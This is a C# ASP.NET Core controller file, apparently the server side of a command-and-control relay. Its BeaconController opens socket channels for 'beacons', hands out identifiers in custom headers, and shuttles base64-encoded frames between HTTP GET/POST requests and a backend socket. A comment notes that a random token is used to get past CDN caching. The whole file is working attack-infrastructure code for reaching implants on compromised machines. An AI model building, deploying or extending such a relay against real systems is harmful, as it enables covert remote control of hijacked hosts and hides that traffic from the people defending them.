using System;
using System.IO;
using ClientC2;
using ClientC2.channels;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Options;

namespace ServerC2
{
    /// <summary>
    ///     Relays beacon requests/responses to/from the socket channel
    ///     rid is not used, it is a random generated token sent by beacon to bypass short time CDN caching if not disabled
    /// </summary>
    /// <seealso cref="Controller" />
    [Route("beacon/{rid?}")]
    public class BeaconController : Controller
    {
        private const string IdHeader = "X-C2-Beacon";
        private readonly ChannelManager<SocketChannel> _manager;
        private readonly SocketSettings _settings;

        /// <summary>
        ///     Initializes a new instance of the <see cref="BeaconController" /> class.
        /// </summary>
        /// <param name="settings">The settings.</param>
        /// <param name="manager">The manager.</param>
        public BeaconController(IOptions<SocketSettings> settings, ChannelManager<SocketChannel> manager)
        {
            _settings = settings.Value;
            _manager = manager;
        }

        /// <summary>
        ///     OPTIONS: /beacon
        ///     Grabs web channel options and creates new channel for beacon
        /// </summary>
        [HttpOptions]
        public void Options()
        {
            var socket = new SocketChannel(_settings.IpAddress, _settings.Port);
            socket.Connect();
            var beaconId = new BeaconId { InternalId = Guid.NewGuid() };
            _manager.AddChannel(beaconId, socket);

            // TODO: Implement more robust request/response configuration
            HttpContext.Response.Headers.Add("X-Id-Header", IdHeader);
            HttpContext.Response.Headers.Add("X-Identifier", beaconId.InternalId.ToString());
        }

        /// <summary>
        ///     GET: /beacon
        ///     Calls the socket channel's ReadFrame method
        /// </summary>
        /// <returns>Base64 encoded bytes from socket</returns>
        [HttpGet]
        public string Get()
        {
            var beacon = GetBeacon();

            return beacon.socket != null
                ? Convert.ToBase64String(beacon.socket.ReadFrame())
                : string.Empty;
        }

        /// <summary>
        ///     POST: /beacon
        ///     Calls the socket channel's SendFrame method
        /// </summary>
        [HttpPost]
        public void Post()
        {
            var reader = new StreamReader(HttpContext.Request.Body);
            var b64Str = reader.ReadToEnd();
            reader.Dispose();

            var frame = Convert.FromBase64String(b64Str);
            GetBeacon().socket.SendFrame(frame);
        }

        /// <summary>
        ///     Gets the Beacon ID from the header
        /// </summary>
        /// <returns>The beacon's ID and SocketChannel</returns>
        private (Guid id, SocketChannel socket) GetBeacon()
        {
            var headers = HttpContext.Request.Headers;
            var beaconId = headers.ContainsKey(IdHeader)
                ? Guid.Parse(headers[IdHeader])
                : Guid.Empty;

            return (beaconId, _manager.GetChannelById(new BeaconId { InternalId = beaconId }));
        }
    }
}